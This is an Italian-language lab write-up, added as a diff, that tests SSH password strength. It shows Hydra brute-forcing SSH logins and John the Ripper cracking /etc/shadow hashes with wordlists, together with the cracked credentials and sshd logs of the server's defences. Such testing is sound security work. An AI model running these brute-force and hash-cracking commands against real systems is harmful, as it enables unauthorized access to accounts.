@@ -1,0 +1,65 @@
+Password cracker on-line
+
+Hydra è uno strumento ben conosciuto con il quale è possibile  lanciare attacchi a “forza bruta” brute-force su credenziali di accesso 
+per diversi protocolli. L’utility Hydra ha la possibilità di "attaccare" i login su una varietà di protocolli differenti, 
+ma in questo caso, andremo a testare la resistenza delle password su SSH.
+
+_____________________________________________________________________________________________________________________________
+hydra -L user.txt -P pass.txt ns81 ssh -c 1
+
+[22][ssh] host: ns81   login: guest   password: abcd1234
+[22][ssh] host: ns81   login: info   password: 12345678
+[22][ssh] host: ns81   login: administrator   password: passw0rd
+1 of 1 target successfully completed, 3 valid passwords found
+_____________________________________________________________________________________________________________________________
+Accesso al server:
+
+ns81 sshd[494]: Accepted password for administrator from 10.10.10.2 port 58908 ssh2
+ns81 sshd[494]: pam_unix(sshd:session): session opened for user administrator(uid=1008) by administrator(uid=0)
+ns81 sshd[505]: Received disconnect from 10.10.10.2 port 58908:11: Bye Bye
+
+Hydra riesce ad accedere al server e si disconnette dal server subito dopo (Bye Bye).
+_____________________________________________________________________________________________________________________________
+Il server non trova gli user:
+
+ns81 sshd[506]: Failed password for invalid user oracle from 10.10.10.2 port 36280 ssh2
+ns81 sshd[506]: pam_unix(sshd:auth): check pass; user unknown
+
+Il server chiede lo stesso la password così fa finta che lo user esista, per cercare di ingannare chi esegue l'attacco.
+_____________________________________________________________________________________________________________________________
+Linee di difesa del server(tentativi massimi): 
+
+ns81 sshd[510]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser=r host=10.10.10.2  user=root
+ns81 sshd[510]: Failed password for root from 10.10.10.2 port 46502 ssh2
+ns81 sshd[510]: message repeated 5 times: [ Failed password for root from 10.10.10.2 port 46502 ssh2]
+ns81 sshd[510]: error: maximum authentication attempts exceeded for root from 10.10.10.2 port 46502 ssh2 [preauth]
+ns81 sshd[510]: Disconnecting authenticating user root 10.10.10.2 port 46502: Too many authentication failures [preauth]
+ns81 sshd[510]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.10.10.2  user=root
+ns81 sshd[510]: PAM service(sshd) ignoring max retries; 6 > 3
+
+Il server aggiunge un massimo numero di tentativi per sessione così da evitare troppi tentativi ed ignora la richiesta di retry e 
+lascia che sia il programma principale (SSHD) a chiudere la connessione. In caso si possono utilizzare queste righe di log 
+per decidere se bloccare un determinato IP.
+_____________________________________________________________________________________________________________________________
+Password cracker off-line
+
+Usando il dizionario /usr/share/john/password.lst
+john --rules /etc/shadow
+
+Loaded 8 password hashes with 8 different salts (md5crypt [MD5 32/64 X2])
+Will run 8 OpenMP threads
+abcd1234         (guest)
+passw0rd         (administrator)
+12345678         (info)
+qwerty0          (mysql)
+Session aborted
+
+Nota: John ha individuato la password qwerty0 per l'utente mysql, che solitamente non è accessibile via SSH (utente di servizio).
+
+Nel secondo test, l'uso della wordlist italiana diz_ita.txt ha permesso di crackare la password dell'utente test (ciaociao)
+john --rules /etc/shadow --wordlist=diz_ita.txt.
+
+Loaded 8 password hashes with 8 different salts (md5crypt [MD5 32/64 X2])
+Will run 8 OpenMP threads
+ciaociao         (test)
+Session aborted
